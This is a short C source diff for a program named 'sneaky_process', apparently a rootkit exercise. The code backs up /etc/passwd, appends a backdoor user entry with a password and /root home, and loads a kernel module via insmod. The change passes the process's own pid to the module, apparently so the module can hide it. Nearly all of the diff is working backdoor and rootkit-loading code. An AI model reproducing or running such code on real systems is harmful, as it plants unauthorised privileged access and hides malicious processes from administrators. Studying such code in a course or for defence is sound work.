@@ -18,14 +18,18 @@ void execv_line() {
 }
 
 int main() {
+  char load_mod[50];
+
   printf("sneaky_process pid = %d\n", getpid());  // print pid
 
   system("cp /etc/passwd /tmp");    // backup password
 
   // insert new password
   system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash' >> /etc/passwd");   
-  
-  system("sudo insmod sneaky_mod.ko");  // load mod
+
+  // load mod, with the current process id as parameter
+  sprintf(load_mod, "insmod sneaky_mod.ko pid_str=\"%d\"", getpid());
+  system(load_mod);
 
   execv_line(); // execute terminal commands
   
